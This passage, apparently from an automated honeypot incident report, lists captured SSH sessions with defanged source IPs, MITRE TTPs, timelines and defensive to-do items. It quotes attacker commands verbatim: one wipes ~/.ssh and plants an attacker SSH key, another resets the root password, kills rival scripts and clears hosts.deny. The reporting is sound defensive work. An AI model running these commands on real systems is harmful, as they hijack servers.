| `2026-04-12 06:14:16` | `cowrie.log.closed` |
| `2026-04-12 06:14:17` | `cowrie.session.params` |
| `2026-04-12 06:14:17` | `cowrie.command.input` |
| `2026-04-12 06:14:17` | `cowrie.log.closed` |
| `2026-04-12 06:14:17` | `cowrie.session.params` |
| `2026-04-12 06:14:17` | `cowrie.command.input` |
| `2026-04-12 06:14:17` | `cowrie.log.closed` |
| `2026-04-12 06:14:18` | `cowrie.session.params` |
| `2026-04-12 06:14:18` | `cowrie.command.input` |
| `2026-04-12 06:14:18` | `cowrie.command.input` |
| `2026-04-12 06:14:18` | `cowrie.log.closed` |
| `2026-04-12 06:14:18` | `cowrie.session.params` |
| `2026-04-12 06:14:18` | `cowrie.command.input` |
| `2026-04-12 06:14:18` | `cowrie.log.closed` |
| `2026-04-12 06:14:19` | `cowrie.session.params` |
| `2026-04-12 06:14:19` | `cowrie.command.input` |
| `2026-04-12 06:14:19` | `cowrie.log.closed` |
| `2026-04-12 06:14:19` | `cowrie.session.params` |
| `2026-04-12 06:14:19` | `cowrie.command.input` |
| `2026-04-12 06:14:19` | `cowrie.log.closed` |
| `2026-04-12 06:14:19` | `cowrie.session.params` |
| `2026-04-12 06:14:19` | `cowrie.command.input` |
| `2026-04-12 06:14:20` | `cowrie.log.closed` |
| `2026-04-12 06:14:20` | `cowrie.session.params` |
| `2026-04-12 06:14:20` | `cowrie.command.input` |
| `2026-04-12 06:14:20` | `cowrie.log.closed` |
| `2026-04-12 06:14:20` | `cowrie.session.params` |
| `2026-04-12 06:14:20` | `cowrie.command.input` |
| `2026-04-12 06:14:20` | `cowrie.log.closed` |
| `2026-04-12 06:14:21` | `cowrie.session.params` |
| `2026-04-12 06:14:21` | `cowrie.command.input` |
| `2026-04-12 06:14:21` | `cowrie.log.closed` |
| `2026-04-12 06:14:21` | `cowrie.session.params` |
| `2026-04-12 06:14:21` | `cowrie.command.input` |
| `2026-04-12 06:14:21` | `cowrie.log.closed` |
| `2026-04-12 06:14:22` | `cowrie.session.params` |
| `2026-04-12 06:14:22` | `cowrie.command.input` |
| `2026-04-12 06:14:22` | `cowrie.log.closed` |
| `2026-04-12 06:14:22` | `cowrie.session.params` |
| `2026-04-12 06:14:22` | `cowrie.command.input` |
| `2026-04-12 06:14:22` | `cowrie.log.closed` |
| `2026-04-12 06:14:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.131[.]112` to AbuseIPDB if not already reported
- [ ] Block `14.103.131[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db56057843e8

| Field | Detail |
|---|---|
| **Source IP** | `23.88.103[.]45` |
| **First Seen** | 2026-04-12 06:14 |
| **Last Seen** | 2026-04-12 06:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:14:21` | `cowrie.session.connect` |
| `2026-04-12 06:14:21` | `cowrie.client.version` |
| `2026-04-12 06:14:21` | `cowrie.client.kex` |
| `2026-04-12 06:14:22` | `cowrie.login.success` |
| `2026-04-12 06:14:22` | `cowrie.session.params` |
| `2026-04-12 06:14:22` | `cowrie.command.input` |
| `2026-04-12 06:14:22` | `cowrie.command.failed` |
| `2026-04-12 06:14:22` | `cowrie.log.closed` |
| `2026-04-12 06:14:23` | `cowrie.session.params` |
| `2026-04-12 06:14:23` | `cowrie.command.input` |
| `2026-04-12 06:14:23` | `cowrie.session.file_download` |
| `2026-04-12 06:14:23` | `cowrie.log.closed` |
| `2026-04-12 06:14:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.88.103[.]45` to AbuseIPDB if not already reported
- [ ] Block `23.88.103[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08f916567273

| Field | Detail |
|---|---|
| **Source IP** | `23.88.103[.]45` |
| **First Seen** | 2026-04-12 06:14 |
| **Last Seen** | 2026-04-12 06:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:14:25` | `cowrie.session.connect` |
| `2026-04-12 06:14:25` | `cowrie.client.version` |
| `2026-04-12 06:14:25` | `cowrie.client.kex` |
| `2026-04-12 06:14:26` | `cowrie.login.success` |
| `2026-04-12 06:14:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.88.103[.]45` to AbuseIPDB if not already reported
- [ ] Block `23.88.103[.]45` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f769fd219c5

| Field | Detail |
|---|---|
| **Source IP** | `103.186.1[.]59` |
| **First Seen** | 2026-04-12 06:15 |
| **Last Seen** | 2026-04-12 06:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:15:59` | `cowrie.session.connect` |
| `2026-04-12 06:15:59` | `cowrie.client.version` |
| `2026-04-12 06:15:59` | `cowrie.client.kex` |
| `2026-04-12 06:16:00` | `cowrie.login.success` |
| `2026-04-12 06:16:00` | `cowrie.session.params` |
| `2026-04-12 06:16:00` | `cowrie.command.input` |
| `2026-04-12 06:16:00` | `cowrie.command.failed` |
| `2026-04-12 06:16:01` | `cowrie.log.closed` |
| `2026-04-12 06:16:01` | `cowrie.session.params` |
| `2026-04-12 06:16:01` | `cowrie.command.input` |
| `2026-04-12 06:16:01` | `cowrie.session.file_download` |
| `2026-04-12 06:16:01` | `cowrie.log.closed` |
| `2026-04-12 06:16:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.186.1[.]59` to AbuseIPDB if not already reported
- [ ] Block `103.186.1[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a340762346f1

| Field | Detail |
|---|---|
| **Source IP** | `103.186.1[.]59` |
| **First Seen** | 2026-04-12 06:16 |
| **Last Seen** | 2026-04-12 06:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:16:04` | `cowrie.session.connect` |
| `2026-04-12 06:16:04` | `cowrie.client.version` |
| `2026-04-12 06:16:04` | `cowrie.client.kex` |
| `2026-04-12 06:16:05` | `cowrie.login.success` |
| `2026-04-12 06:16:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.186.1[.]59` to AbuseIPDB if not already reported
- [ ] Block `103.186.1[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46a70552c235

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-04-12 06:17 |
| **Last Seen** | 2026-04-12 06:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:17:57` | `cowrie.session.connect` |
| `2026-04-12 06:17:57` | `cowrie.client.version` |
| `2026-04-12 06:17:58` | `cowrie.client.kex` |
| `2026-04-12 06:17:58` | `cowrie.login.success` |
| `2026-04-12 06:17:59` | `cowrie.session.params` |
| `2026-04-12 06:17:59` | `cowrie.command.input` |
| `2026-04-12 06:17:59` | `cowrie.command.failed` |
| `2026-04-12 06:17:59` | `cowrie.log.closed` |
| `2026-04-12 06:17:59` | `cowrie.session.params` |
| `2026-04-12 06:17:59` | `cowrie.command.input` |
| `2026-04-12 06:18:00` | `cowrie.session.file_download` |
| `2026-04-12 06:18:00` | `cowrie.log.closed` |
| `2026-04-12 06:18:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91a706e7bfbd

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-04-12 06:18 |
| **Last Seen** | 2026-04-12 06:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:18:02` | `cowrie.session.connect` |
| `2026-04-12 06:18:02` | `cowrie.client.version` |
| `2026-04-12 06:18:02` | `cowrie.client.kex` |
| `2026-04-12 06:18:03` | `cowrie.login.success` |
| `2026-04-12 06:18:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35d3c8b239cc

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-04-12 06:19 |
| **Last Seen** | 2026-04-12 06:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:19:46` | `cowrie.session.connect` |
| `2026-04-12 06:19:46` | `cowrie.client.version` |
| `2026-04-12 06:19:46` | `cowrie.client.kex` |
| `2026-04-12 06:19:46` | `cowrie.login.success` |
| `2026-04-12 06:19:47` | `cowrie.session.params` |
| `2026-04-12 06:19:47` | `cowrie.command.input` |
| `2026-04-12 06:19:47` | `cowrie.command.failed` |
| `2026-04-12 06:19:47` | `cowrie.log.closed` |
| `2026-04-12 06:19:47` | `cowrie.session.params` |
| `2026-04-12 06:19:47` | `cowrie.command.input` |
| `2026-04-12 06:19:48` | `cowrie.session.file_download` |
| `2026-04-12 06:19:48` | `cowrie.log.closed` |
| `2026-04-12 06:19:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56816addbf1c

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-04-12 06:19 |
| **Last Seen** | 2026-04-12 06:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:19:50` | `cowrie.session.connect` |
| `2026-04-12 06:19:50` | `cowrie.client.version` |
| `2026-04-12 06:19:50` | `cowrie.client.kex` |
| `2026-04-12 06:19:51` | `cowrie.login.success` |
| `2026-04-12 06:19:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55469d8c2df5

| Field | Detail |
|---|---|
| **Source IP** | `222.71.205[.]34` |
| **First Seen** | 2026-04-12 06:21 |
| **Last Seen** | 2026-04-12 06:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:21:58` | `cowrie.session.connect` |
| `2026-04-12 06:21:58` | `cowrie.client.version` |
| `2026-04-12 06:21:58` | `cowrie.client.kex` |
| `2026-04-12 06:21:59` | `cowrie.login.success` |
| `2026-04-12 06:21:59` | `cowrie.session.params` |
| `2026-04-12 06:21:59` | `cowrie.command.input` |
| `2026-04-12 06:21:59` | `cowrie.command.failed` |
| `2026-04-12 06:21:59` | `cowrie.log.closed` |
| `2026-04-12 06:22:00` | `cowrie.session.params` |
| `2026-04-12 06:22:00` | `cowrie.command.input` |
| `2026-04-12 06:22:00` | `cowrie.session.file_download` |
| `2026-04-12 06:22:00` | `cowrie.log.closed` |
| `2026-04-12 06:22:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.71.205[.]34` to AbuseIPDB if not already reported
- [ ] Block `222.71.205[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ceda92a60f0e

| Field | Detail |
|---|---|
| **Source IP** | `222.71.205[.]34` |
| **First Seen** | 2026-04-12 06:22 |
| **Last Seen** | 2026-04-12 06:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:22:06` | `cowrie.session.connect` |
| `2026-04-12 06:22:06` | `cowrie.client.version` |
| `2026-04-12 06:22:06` | `cowrie.client.kex` |
| `2026-04-12 06:22:07` | `cowrie.login.success` |
| `2026-04-12 06:22:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.71.205[.]34` to AbuseIPDB if not already reported
- [ ] Block `222.71.205[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ea01c898c9e

| Field | Detail |
|---|---|
| **Source IP** | `222.71.205[.]34` |
| **First Seen** | 2026-04-12 06:22 |
| **Last Seen** | 2026-04-12 06:22 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:snSS8yfPiji4"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:22:33` | `cowrie.session.connect` |
| `2026-04-12 06:22:33` | `cowrie.client.version` |
| `2026-04-12 06:22:33` | `cowrie.client.kex` |
| `2026-04-12 06:22:34` | `cowrie.login.success` |
| `2026-04-12 06:22:34` | `cowrie.session.params` |
| `2026-04-12 06:22:34` | `cowrie.command.input` |
| `2026-04-12 06:22:34` | `cowrie.command.failed` |
| `2026-04-12 06:22:34` | `cowrie.log.closed` |
| `2026-04-12 06:22:35` | `cowrie.session.params` |
| `2026-04-12 06:22:35` | `cowrie.command.input` |
| `2026-04-12 06:22:35` | `cowrie.session.file_download` |
| `2026-04-12 06:22:35` | `cowrie.log.closed` |
| `2026-04-12 06:22:43` | `cowrie.session.params` |
| `2026-04-12 06:22:43` | `cowrie.command.input` |
| `2026-04-12 06:22:43` | `cowrie.log.closed` |
| `2026-04-12 06:22:44` | `cowrie.session.params` |
| `2026-04-12 06:22:44` | `cowrie.command.input` |
| `2026-04-12 06:22:44` | `cowrie.log.closed` |
| `2026-04-12 06:22:44` | `cowrie.session.params` |
| `2026-04-12 06:22:44` | `cowrie.command.input` |
| `2026-04-12 06:22:44` | `cowrie.session.file_download` |
| `2026-04-12 06:22:44` | `cowrie.log.closed` |
| `2026-04-12 06:22:44` | `cowrie.session.params` |
| `2026-04-12 06:22:44` | `cowrie.command.input` |
| `2026-04-12 06:22:45` | `cowrie.log.closed` |
| `2026-04-12 06:22:45` | `cowrie.session.params` |
| `2026-04-12 06:22:45` | `cowrie.command.input` |
| `2026-04-12 06:22:45` | `cowrie.log.closed` |
| `2026-04-12 06:22:45` | `cowrie.session.params` |
| `2026-04-12 06:22:45` | `cowrie.command.input` |
| `2026-04-12 06:22:45` | `cowrie.command.input` |
| `2026-04-12 06:22:45` | `cowrie.log.closed` |
| `2026-04-12 06:22:46` | `cowrie.session.params` |
| `2026-04-12 06:22:46` | `cowrie.command.input` |
| `2026-04-12 06:22:46` | `cowrie.log.closed` |
| `2026-04-12 06:22:46` | `cowrie.session.params` |
| `2026-04-12 06:22:46` | `cowrie.command.input` |
| `2026-04-12 06:22:46` | `cowrie.log.closed` |
| `2026-04-12 06:22:47` | `cowrie.session.params` |
| `2026-04-12 06:22:47` | `cowrie.command.input` |
| `2026-04-12 06:22:47` | `cowrie.log.closed` |
| `2026-04-12 06:22:47` | `cowrie.session.params` |
| `2026-04-12 06:22:47` | `cowrie.command.input` |
| `2026-04-12 06:22:47` | `cowrie.log.closed` |
| `2026-04-12 06:22:48` | `cowrie.session.params` |
| `2026-04-12 06:22:48` | `cowrie.command.input` |
| `2026-04-12 06:22:48` | `cowrie.log.closed` |
| `2026-04-12 06:22:48` | `cowrie.session.params` |
| `2026-04-12 06:22:48` | `cowrie.command.input` |
| `2026-04-12 06:22:48` | `cowrie.log.closed` |
| `2026-04-12 06:22:48` | `cowrie.session.params` |
| `2026-04-12 06:22:48` | `cowrie.command.input` |
| `2026-04-12 06:22:48` | `cowrie.log.closed` |
| `2026-04-12 06:22:49` | `cowrie.session.params` |
| `2026-04-12 06:22:49` | `cowrie.command.input` |
| `2026-04-12 06:22:50` | `cowrie.log.closed` |
| `2026-04-12 06:22:50` | `cowrie.session.params` |
| `2026-04-12 06:22:50` | `cowrie.command.input` |
| `2026-04-12 06:22:50` | `cowrie.log.closed` |
| `2026-04-12 06:22:51` | `cowrie.session.params` |
| `2026-04-12 06:22:51` | `cowrie.command.input` |
| `2026-04-12 06:22:51` | `cowrie.log.closed` |
| `2026-04-12 06:22:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.71.205[.]34` to AbuseIPDB if not already reported
- [ ] Block `222.71.205[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db490bfe1ad6

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-04-12 06:23 |
| **Last Seen** | 2026-04-12 06:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:23:30` | `cowrie.session.connect` |
| `2026-04-12 06:23:30` | `cowrie.client.version` |
| `2026-04-12 06:23:31` | `cowrie.client.kex` |
| `2026-04-12 06:23:31` | `cowrie.login.success` |
| `2026-04-12 06:23:32` | `cowrie.session.params` |
| `2026-04-12 06:23:32` | `cowrie.command.input` |
| `2026-04-12 06:23:32` | `cowrie.command.failed` |
| `2026-04-12 06:23:32` | `cowrie.log.closed` |
| `2026-04-12 06:23:32` | `cowrie.session.params` |
| `2026-04-12 06:23:32` | `cowrie.command.input` |
| `2026-04-12 06:23:32` | `cowrie.session.file_download` |
| `2026-04-12 06:23:32` | `cowrie.log.closed` |
| `2026-04-12 06:23:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaaaa9918bd4

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-04-12 06:23 |
| **Last Seen** | 2026-04-12 06:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:23:35` | `cowrie.session.connect` |
| `2026-04-12 06:23:35` | `cowrie.client.version` |
| `2026-04-12 06:23:35` | `cowrie.client.kex` |
| `2026-04-12 06:23:36` | `cowrie.login.success` |
| `2026-04-12 06:23:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d4fba43bf1a

| Field | Detail |
|---|---|
| **Source IP** | `222.71.205[.]34` |
